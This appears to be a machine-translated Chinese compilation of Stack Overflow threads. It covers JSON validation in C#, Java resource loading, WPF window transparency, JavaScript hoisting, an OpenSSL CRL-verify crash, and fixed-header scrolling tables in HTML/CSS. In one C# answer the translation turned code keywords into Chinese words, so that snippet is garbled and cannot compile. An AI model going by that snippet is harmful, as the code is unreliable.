## 回答 #9

> 赞同：0
> 
> 时间：2017-09-07T17:42:33.003

此方法不需要外部库

```
using System.Web.Script.Serialization;
bool IsValidJson(string json)
    {
        try {
            var serializer = new JavaScriptSerializer();
            dynamic result = serializer.DeserializeObject(json);
            return true;
        } catch { return false; }
    } 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-03-31T19:45:41.420

这是基于 Habib 回答的 TryParse 扩展方法：

```
public static bool TryParse(this string strInput, out JToken output)
{
    if (String.IsNullOrWhiteSpace(strInput))
    {
        output = null;
        return false;
    }
    strInput = strInput.Trim();
    if ((strInput.StartsWith("{") && strInput.EndsWith("}")) || //For object
        (strInput.StartsWith("[") && strInput.EndsWith("]"))) //For array
    {
        try
        {
            output = JToken.Parse(strInput);
            return true;
        }
        catch (JsonReaderException jex)
        {
            //Exception in parsing json
            //optional: LogError(jex);
            output = null;
            return false;
        }
        catch (Exception ex) //some other exception
        {
            //optional: LogError(ex);
            output = null;
            return false;
        }
    }
    else
    {
        output = null;
        return false;
    }
} 
```

用法：

```
JToken jToken;
if (strJson.TryParse(out jToken))
{
    // work with jToken
}
else
{
    // not valid json
} 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2020-04-19T20:30:45.683

我正在使用这个：

```
 internal static bool IsValidJson(string data)
  {
     data = data.Trim();
     try
     {
        if (data.StartsWith("{") && data.EndsWith("}"))
        {
           JToken.Parse(data);
        }
        else if (data.StartsWith("[") && data.EndsWith("]"))
        {
           JArray.Parse(data);
        }
        else
        {
           return false;
        }
        return true;
     }
     catch
     {
        return false;
     }
  } 
```

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2021-11-12T19:02:17.567

即使返回异常也返回 json 字符串的扩展：

```
        公共静态字符串 OnlyValidJson（此字符串 strInput）
        {
            if (string.IsNullOrWhiteSpace(strInput)) { return @"[""Json 为空""]"; }
            strInput = strInput.Trim();
            if ((strInput.StartsWith("{") && strInput.EndsWith("}")) ||
                (strInput.StartsWith("[") && strInput.EndsWith("]")))
            {
                尝试
                {
                    字符串 strEscape = strInput.Replace("\\n", "").Replace("\\r", "").Replace("\n", "").Replace("\r", "") ;
                    JToken.Parse(strEscape);
                    返回strEscape；
                }
                捕捉（JsonReaderException jex）
                {
                    返回@$"{{""JsonReaderException"":""{jex.Message}""}}";
                }
                捕捉（例外前）
                {
                    Console.WriteLine(ex.ToString());
                    返回@$"{{""异常"":""{ex.ToString()}""}}";
                }
            }
            别的
            {
                return @"[""Json 不以 { 或 [.""]" 开头；
            }
        }

```

# java - Java .class.getResourceAsStream()

> ID：14977851
> 
> 赞同：5
> 
> 时间：2013-02-20T10:42:42.997
> 
> 标签：java, jar, inputstream

据我所知，`Class.getResourceAsStream()`得到一个`InputStream`指向 .jar 文件中的文件？如果我对此有误，请纠正我。

有什么方法可以临时将外部文件“加载”到 .jar 中，以便该`getResourceAsStream()`方法可以检索它？

例如加载`C:/folder/file.txt`到 .jar 中，以便`MyClass.class .getResourceAsStream("file.txt")`将工作返回`InputStream`到文件中，或者至少将它的副本暂时“加载”到 .jar 中。

很抱歉我的措辞如此糟糕，我希望你能理解我正在尝试做的事情，不太清楚如何简单地解释它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:46:09.917

不，getResourceAsStream() 方法从类路径中获取文件。这包括在命令行上像这样指定的任何内容（windows 版本，linux 使用 ':' 作为分隔符）：

```
java -cp "path;path2;path3;path4/some.jar" your.main.Clazz 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:46:39.757

```
this.getClass().getResourceAsStream("myImage.png"); 
```

确保您的图像在类路径中。无需将其放入任何`JAR`此类中。

# wpf - WPF 模态窗口透明度

> ID：14977853
> 
> 赞同：1
> 
> 时间：2013-02-20T10:42:54.167
> 
> 标签：wpf, xaml, styling

我创建了一个模态 WPF 窗口，如下所示：

![在此处输入图像描述](../Images/d1b84ba78c0cd85efe2f6a9bf1e2b77f.png)

这是窗口的代码：

```
<Window x:Class="Dionysus.Core.Controls.ModalWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="ModalWindow" AllowsTransparency="True" Background="Transparent" WindowStyle="None">

<Grid Name="MainGrid">
    <Rectangle Fill="Gray" Opacity="0.7" />
</Grid> 
```

然后添加“ErrorControl”，如下所示：

```
MainGrid.Children.Add(uc); 
```

问题是，只要我展开堆栈跟踪，控件的透明度也会发生变化：

![在此处输入图像描述](../Images/0b9342afc06ce7a02fd01a6a0b910e3b.png)

我假设这与`ScrollViewer`使用不正确的透明度有关，即，`Rectangle`而不是包含`Window`。

我还将拥有1 的`Opacity`of设置为 1，然后绑定：`UserControl``ScrollViewer``Opacity`

```
<ScrollViewer Background="WhiteSmoke" Opacity="{Binding RelativeSource={RelativeSource Mode=FindAncestor, AncestorType=UserControl}, Path=Opacity}"> 
```

谁能帮我？

--

更新

这`UserControl`是插入到`Window`

```
<Grid x:Name="LayoutRootx" Background="WhiteSmoke">
        <StackPanel VerticalAlignment="Stretch">
            <TextBlock TextWrapping="Wrap" Margin="5" Text="An error has occured:" Foreground="Black" FontSize="15" FontWeight="Medium"/>
            <TextBlock TextWrapping="Wrap" Margin="5,10,5,5" Text="{Binding Error}"/>
            <odc:OdcExpander Header="Stack Trace" Margin="5" IsExpanded="False" Background="WhiteSmoke">
                <TextBox Text="{Binding StackTrace}" TextWrapping="Wrap" Margin="5,10,5,5" IsReadOnly="True" MaxHeight="370"/>
            </odc:OdcExpander>
            <odc:OdcExpander Header="Comment" Margin="5" IsExpanded="False">
                <TextBox Text="{Binding Comment}" TextWrapping="Wrap" Margin="5,10,5,5" MaxHeight="370" Name="txtComment"/>
            </odc:OdcExpander>
            <StackPanel Margin="5,10,5,5" Orientation="Horizontal" HorizontalAlignment="Left">
                <Button Style="{StaticResource DionysusButton}"  Width="100" Height="23" IsDefault="True" Name="btnSendError">
                    <StackPanel Orientation="Horizontal">
                        <Image Source="/Dionysus.Shell;component/Images/camera-icon.png" Margin="0,0,5,0">

                        </Image>
                        <TextBlock Text="Send to IT" VerticalAlignment="Center"/>
                        <core:DionysusTriggerAction Height="0" Width="0" TargetControl="{Binding ElementName=btnSendError}" MethodName="SendError"></core:DionysusTriggerAction>
                    </StackPanel>
                </Button>
                <Button Style="{StaticResource DionysusButton}"  Width="100" Height="23" Name="btnExit" Margin="10,0,0,0" IsCancel="True">
                    <StackPanel Orientation="Horizontal">
                        <Image Source="/Dionysus.Shell;component/Images/DeleteRed.png" Margin="0,0,5,0">

                        </Image>
                        <TextBlock Text="Close" VerticalAlignment="Center"/>
                    </StackPanel>
                </Button>
                <core:DionysusTriggerAction Height="0" Name="triggerAction2" Width="0" TargetControl="{Binding ElementName=btnExit}" MethodName="Exit"></core:DionysusTriggerAction>
            </StackPanel>
        </StackPanel>
    </Grid> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T12:16:08.697

如果您的窗口具有固定大小且无法调整大小，则可以使用以下技巧：

```
<Grid>
    <Border BorderThickness="100" BorderBrush="Gray" Opacity="0.7">
        <Grid Background="White" Grid.Column="1" Grid.Row="1" x:Name="contentPlaceHolder">
            <TextBlock  Text="HELLO WORLD" HorizontalAlignment="Center" VerticalAlignment="Center"/>
        </Grid>
    </Border>
</Grid> 
```

但是，您的 Window 不太可能始终具有相同的大小，因此为了使其更具动态性，您可以按如下方式更改 Window 的布局：

```
<Grid>
    <Grid.ColumnDefinitions>
        <ColumnDefinition/>
        <ColumnDefinition Width="YourDesiredSize"/>
        <ColumnDefinition/>
    </Grid.ColumnDefinitions>
    <Grid.RowDefinitions>
        <RowDefinition/>
        <RowDefinition Height="YourDesiredSize"/>
        <RowDefinition/>
    </Grid.RowDefinitions>
    <Rectangle Fill="Gray" Opacity="0.7" Grid.Row="0" Grid.ColumnSpan="3"/>
    <Rectangle Fill="Gray" Opacity="0.7" Grid.Row="2" Grid.ColumnSpan="3"/>
    <Rectangle Fill="Gray" Opacity="0.7" Grid.Row="1" Grid.Column="0"/>
    <Rectangle Fill="Gray" Opacity="0.7" Grid.Row="1" Grid.Column="2"/>

    <Grid Grid.Column="1" Grid.Row="1" Background="White" x:Name="contentPlaceHolder">
        <TextBlock  Text="HELLO WORLD" HorizontalAlignment="Center" VerticalAlignment="Center"/>
    </Grid>
</Grid> 
```

这个窗口放在另一个窗口上的结果或多或少是这样的：

![透明滚动查看器](../Images/0245a9fae011b9f3605af31d5f7d2682.png)

然后不是添加到`MainGrid`，而是将 UserControl 添加到`contentPlaceHolder`或者您想要调用它：

```
contentPlaceHolder.Children.Add(uc); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-22T09:35:06.910

好的，所以我找到了一个适合我的解决方案，我确信它不是最好的，但它可能会帮助遇到与我相同问题的人。

问题是`UserControl`我添加到我的控件`Window`是透明的，虽然我无法弄清楚原因，但我找到了一个简单的解决方法。

通过将 的`OpacityMask`属性更改`UserControl`为所需的`Background`颜色，即使控件的不透明度发生变化，它也会被`Brush`您提供的 所掩盖。

```
uc.OpacityMask = Brushes.WhiteSmoke; 
```

希望它可以帮助某人！

# javascript - 在执行第一行之前是否需要解释每一行 JavaScript？

> ID：14977856
> 
> 赞同：2
> 
> 时间：2013-02-20T10:42:59.877
> 
> 标签：javascript

我倾向于把 JavaScript 想象成 Ruby，第一行被解释和执行，最后一行直到最后才被解释。

但由于 JavaScript 受提升规则的约束，例如：

```
console.log(foo);   // foo already has a value

function foo() {
    return 123;
} 
```

那么如果`console.log`是从 HTML 链接的 JavaScript 文件的第一行，并且文件是 200kb，然后 HTML 文件链接了 10 个其他 JavaScript 文件，并且`foo`在最后一个文件的最后一行定义了 ，那么由于提升规则，`foo`即使在第一行也需要定义，这意味着必须在第一行执行之前下载***和解释***所有 11 个文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:44:52.870

不，浏览器一次处理一个文件（或者更确切地说，脚本元素）。稍后的脚本元素将被添加到相同的环境中（因此共享变量），但不会被等待。

如果您加载的第一个文件调用了一个在读取第二个文件之前未定义的函数，那么它将出错。（除非该调用来自一个直到加载第二个文件后才调用的函数）。

# openssl - X509_CRL_verify 段错误

> ID：14977863
> 
> 赞同：1
> 
> 时间：2013-02-20T10:43:16.300
> 
> 标签：openssl

我加载了一个 CA 证书，然后加载了一个 CRL 文件现在我想验证 CRL 实际上来自那个 CA。所以我使用 libcrypto API X509_CRL_Verify 我创建了一个有效的 X509_CRL *crl 对象，现在调用

```
X509_CRL_verify(crl,X509_get_pubkey(ca_cert) 
```

但此时它崩溃了

谁能指出可能是什么问题？CRL 有效，公钥也有效

我已经加载了以下算法

```
ERR_load_crypto_strings();
ERR_load_BIO_strings(); 
OpenSSL_add_all_ciphers();
OpenSSL_add_all_digests(); 
```

# html - 修复了带有水平滚动条和垂直滚动条的标题表

> ID：14977864
> 
> 赞同：71
> 
> 时间：2013-02-20T10:43:17.887
> 
> 标签：html, css, header, html-table, fixed

我一直在试图弄清楚我在使用 html/css 粘性标题 + 滚动条时遇到的这个问题。我们正在创建一个程序，该程序需要在容器大小达到某个点时显示滚动条（取决于用户的分辨率）。

我在表格的第二列上强制设置最小宽度，因此表格在某个点停止减小并强制容器保持在某个宽度。容器上的溢出显示水平滚动条。一切正常。一旦我为垂直滚动添加了第二个滚动条，事情就会变得一团糟。有人有解决这个问题的方法吗？我想在 .table-body 上有一个垂直滚动条，但滚动条必须在外部容器上可见。

固定标题表有没有好的 html/css 解决方案？我一直在寻找一个星期，但只能找到这种行为的 jQuery 插件。

这是我当前的 HTML：

```
<!DOCTYPE html>
<html>
<head>
    <title>fixed header prototyping</title>
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
<div class="outer-container"> <!-- absolute positioned container -->
<div class="inner-container">

    <div class="table-header">
        <table id="headertable" width="100%" cellpadding="0" cellspacing="0">
            <thead>
                <tr>
                    <th class="header-cell col1">One</th>
                    <th class="header-cell col2">Two</th>
                    <th class="header-cell col3">Three</th>
                    <th class="header-cell col4">Four</th>
                    <th class="header-cell col5">Five</th>
                </tr>
            </thead>
        </table>
    </div>

    <div class="table-body">
        <table id="bodytable" width="100%" cellpadding="0" cellspacing="0">
            <tbody>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
</div>

</body>
</html> 
```

我的 CSS 看起来像这样：

```
body {
    margin:0;
    padding:0;
    height: 100%;
    width: 100%;
}
table {
    border-collapse: collapse; /* make simple 1px lines borders if border defined */
}
tr {
    width: 100%;
}

.outer-container {
    background-color: #ccc;
    position: absolute;
    top:0;
    left: 0;
    right: 300px;
    bottom:40px;
    overflow: hidden;

}
.inner-container {
    width: 100%;
    height: 100%;
    position: relative;
    overflow-x: scroll;
    overflow-y:hidden;
}
.table-header {
    float:left;
    width: 100%;
}
.table-body {
    float:left;
    height: 100%;
    width: inherit;
    overflow-y: scroll;
}
.header-cell {
    background-color: yellow;
    text-align: left;
    height: 40px;
}
.body-cell {
    background-color: blue;
    text-align: left;
}
.col1, .col3, .col4, .col5 {
    width:120px;
    min-width: 120px;
}
.col2 {
    min-width: 300px;
} 
```

JSFiddle 示例 - [http://jsfiddle.net/W8URM/](http://jsfiddle.net/W8URM/)

提前谢谢各位！

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2013-09-17T14:20:29.463

这不是一件容易的事。我想出了一个脚本解决方案。（我认为这不能使用纯 CSS 来完成）

**HTML**与您发布的内容保持一致，CSS**略有**变化，添加了**JQuery**代码。

[**工作小提琴**](http://jsfiddle.net/avrahamcool/eZXtq/) *测试：* IE10、IE9、IE8、FF、Chrome

顺便说一句：如果你有独特的元素，为什么不使用 id 而不是类？我认为它提供了更好的选择器性能。

**解释**它是如何工作的： `inner-container`将跨越整个空间`outer-container`（所以基本上，他不需要）但我把他留在那里，所以你不需要改变你的 DOM。

是`table-header`相对定位的，没有滚动（`overflow: hidden`），我们稍后处理他的滚动。

必须`table-body`跨越其余的`inner-container`高度，所以我用一个脚本来确定要修复他的高度。（当您重新调整窗口大小时，它会动态变化）没有固定高度，滚动不会出现，因为 div 只会变大。请注意，如果您修复标题高度并使用，这部分可以在没有脚本的情况下完成CSS3（如答案末尾所示）

现在只需在每次滚动时将标题与正文一起移动即可。这是通过分配给`scroll`事件的函数来完成的。

**CSS**（其中一些是从您的样式中复制而来的）

```
*
{
    padding: 0;
    margin: 0;
}

body
{
    height: 100%;
    width: 100%;
}
table
{
    border-collapse: collapse; /* make simple 1px lines borders if border defined */
}
.outer-container
{
    background-color: #ccc;
    position: absolute;
    top:0;
    left: 0;
    right: 300px;
    bottom: 40px;
}

.inner-container
{
    height: 100%;
    overflow: hidden;
}

.table-header
{
    position: relative;
}
.table-body
{
    overflow: auto;
}

.header-cell
{
    background-color: yellow;
    text-align: left;
    height: 40px;
}
.body-cell 
{
    background-color: blue;
    text-align: left;
}
.col1, .col3, .col4, .col5
{
    width:120px;
    min-width: 120px;
}
.col2
{
    min-width: 300px;
} 
```

**jQuery**

```
$(document).ready(function () {
    setTableBody();
    $(window).resize(setTableBody);
    $(".table-body").scroll(function ()
    {
        $(".table-header").offset({ left: -1*this.scrollLeft });
    });
});

function setTableBody()
{
    $(".table-body").height($(".inner-container").height() - $(".table-header").height());
} 
```

如果您不关心修复标题高度（我看到您在 CSS 中修复了单元格的高度），如果您使用 CSS3 可以跳过一些脚本：[**Shorter Fiddle**](http://jsfiddle.net/avrahamcool/eZXtq/1/)（这在 IE8 上不起作用）

* * *

## 回答 #2

> 赞同：56
> 
> 时间：2013-09-19T19:02:30.763

这是一个解决方案，它又*不是 CSS only 解决方案*。它类似于[*avrahamcool*的解决方案](https://stackoverflow.com/a/18852445/1846192)，因为它使用了几行 jQuery，但它没有改变高度和移动标题，它所做的只是`tbody`根据其父级`table`向右滚动的距离来改变宽度。

**此解决方案的另一个好处是它可以与语义上有效的 HTML 表格一起使用**。

它适用于所有最新的浏览器版本（IE10、Chrome、FF），仅此而已，滚动功能在旧版本上中断。

但是，您使用语义上有效的 HTML 表格这一事实将节省时间并确保表格仍然正确显示，这只是滚动功能在旧版浏览器上不起作用。

这是一个`[**jsFiddle**](http://jsfiddle.net/X2Kmd/389/)`用于演示目的。

**CSS**

```
table {
    width: 300px;
    overflow-x: scroll;
    display: block;
}
thead, tbody {
    display: block;
}
tbody {
    overflow-y: scroll;
    overflow-x: hidden;
    height: 140px;
}
td, th {
    min-width: 100px;
} 
```

**JS**

```
$("table").on("scroll", function () {
    $("table > *").width($("table").width() + $("table").scrollLeft());
}); 
```

我需要一个在 IE9 中可以很好地降级的版本（没有滚动，只是一个普通的表格）。在这里发布小提琴，因为它是一个改进的版本。您需要做的就是在`tr`.

**额外的 CSS 使这个解决方案在 IE9 中很好地降级**

```
tr {
    height: 25px; /* This could be any value, it just needs to be set. */ 
} 
```

这是一个`[**jsFiddle**](http://jsfiddle.net/X2Kmd/389/)`演示该解决方案在 IE9 版本中的良好降级。

**编辑**：更新了小提琴链接以链接到包含评论中提到的问题的修复的小提琴版本。只需添加一个带有最新和最好版本的片段即可：

```
$('table').on('scroll', function() {
  $("table > *").width($("table").width() + $("table").scrollLeft());
});
```

```
html {
  font-family: verdana;
  font-size: 10pt;
  line-height: 25px;
}

table {
  border-collapse: collapse;
  width: 300px;
  overflow-x: scroll;
  display: block;
}

thead {
  background-color: #EFEFEF;
}

thead,
tbody {
  display: block;
}

tbody {
  overflow-y: scroll;
  overflow-x: hidden;
  height: 140px;
}

td,
th {
  min-width: 100px;
  height: 25px;
  border: dashed 1px lightblue;
  overflow: hidden;
  text-overflow: ellipsis;
  max-width: 100px;
}
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<table>
  <thead>
    <tr>
      <th>Column 1</th>
      <th>Column 2</th>
      <th>Column 3</th>
      <th>Column 4</th>
      <th>Column 5</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>AAAAAAAAAAAAAAAAAAAAAAAAAA</td>
      <td>Row 1</td>
      <td>Row 1</td>
      <td>Row 1</td>
      <td>Row 1</td>
    </tr>
    <tr>
      <td>Row 2</td>
      <td>Row 2</td>
      <td>Row 2</td>
      <td>Row 2</td>
      <td>Row 2</td>
    </tr>
    <tr>
      <td>Row 3</td>
      <td>Row 3</td>
      <td>Row 3</td>
      <td>Row 3</td>
      <td>Row 3</td>
    </tr>
    <tr>
      <td>Row 4</td>
      <td>Row 4</td>
      <td>Row 4</td>
      <td>Row 4</td>
      <td>Row 4</td>
    </tr>
    <tr>
      <td>Row 5</td>
      <td>Row 5</td>
      <td>Row 5</td>
      <td>Row 5</td>
      <td>Row 5</td>
    </tr>
    <tr>
      <td>Row 6</td>
      <td>Row 6</td>
      <td>Row 6</td>
      <td>Row 6</td>
      <td>Row 6</td>
    </tr>
    <tr>
      <td>Row 7</td>
      <td>Row 7</td>
      <td>Row 7</td>
      <td>Row 7</td>
      <td>Row 7</td>
    </tr>
    <tr>
      <td>Row 8</td>
      <td>Row 8</td>
      <td>Row 8</td>
      <td>Row 8</td>
      <td>Row 8</td>
    </tr>
    <tr>
      <td>Row 9</td>
      <td>Row 9</td>
      <td>Row 9</td>
      <td>Row 9</td>
      <td>Row 9</td>
    </tr>
    <tr>
      <td>Row 10</td>
      <td>Row 10</td>
      <td>Row 10</td>
      <td>Row 10</td>
      <td>Row 10</td>
    </tr>
  </tbody>
</table>
```

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2016-03-11T18:14:38.173

这是一个仅 HTML / CSS 的解决方案（带有一点 javascript）。

道歉这么久后回答这个问题，但给出的解决方案不适合我，我找到了一个更好的解决方案。这是使用 HTML（无 jquery）的最简单方法：

在此之前，解决方案摆弄了这个问题。[https://jsfiddle.net/3vzrunkt/](https://jsfiddle.net/3vzrunkt/)

```
<div>
    <div style="overflow:hidden;;margin-right:16px" id="headerdiv">
        <table id="headertable" style="min-width:900px" border=1>
            <thead>
                <tr>
                    <th style="width:120px;min-width:120px;">One</th>
                    <th style="width:420px;min-width:420px;">Two</th>
                    <th style="width:120px;min-width:120px;">Three</th>
                    <th style="width:120px;min-width:120px;">Four</th>
                    <th style="width:120px;min-width:120px;">Five</th>
                </tr>
            </thead>
        </table>
    </div>

    <div style="overflow-y:scroll;max-height:200px;" 
         onscroll="document.getElementById('headerdiv').scrollLeft = this.scrollLeft;">
        <table id="bodytable" border=1 style="min-width:900px; border:1px solid">
            <tbody>
                <tr>
                    <td style="width:120px;min-width:120px;">body row1</td>
                    <td style="width:420px;min-width:420px;">body row2</td>
                    <td style="width:120px;min-width:120px;">body row2</td>
                    <td style="width:120px;min-width:120px;">body row2</td>
                    <td style="width:120px;min-width:120px;">body row2 en nog meer</td>
                </tr>
                :
                :
                :
                :

            </tbody>
        </table>
    </div>
</div> 
```

并解释解决方案：

1.  你需要并封闭 div 不需要溢出/滚动

2.  一个标题 div，包含带有溢出的标题表：隐藏以确保不显示滚动条。添加 margin-right:16px 以确保同步时滚动条位于其外部。

3.  另一个 div 用于包含表记录和溢出-y：滚动。请注意，要使滚动条向右移动标题，需要填充。

4.  而最重要的是神奇的js同步表头和表数据：

    ```
     onscroll="document.getElementById('headerdiv').scrollLeft = this.scrollLeft;" 
    ```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-03-25T02:13:22.363

这已经让我发疯了好几个星期。我找到了一个适合我的解决方案，包括：

1.  非固定列宽 - 它们在窗口调整大小时缩小和增长。
2.  表格在需要时有一个水平滚动条，但在不需要时没有。
